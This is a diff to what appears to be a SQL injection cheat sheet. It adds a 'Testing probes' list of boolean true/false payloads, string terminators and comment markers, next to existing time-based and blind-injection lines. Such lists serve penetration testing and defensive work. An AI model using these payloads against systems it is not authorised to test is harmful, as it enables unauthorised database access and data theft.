@@ -95,3 +95,22 @@ select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
 ' OR SUBSTRING(database(),1,1) = 'b
 ' OR SUBSTRING(database(),1,1) = 'c
 ```
+
+## Testing probes
+```
+' OR 'a'='a (TRUE condition for string values)
+
+' OR 'a'='b (FALSE condition for string values)
+
+999999999999 OR 1=1 (TRUE condition for numeric values)
+
+999999999999 OR 1=2 (FALSE condition for numeric values)
+
+' (string terminator)
+
+;
+
+, (list elements separator)
+
+-- (comment)
+```
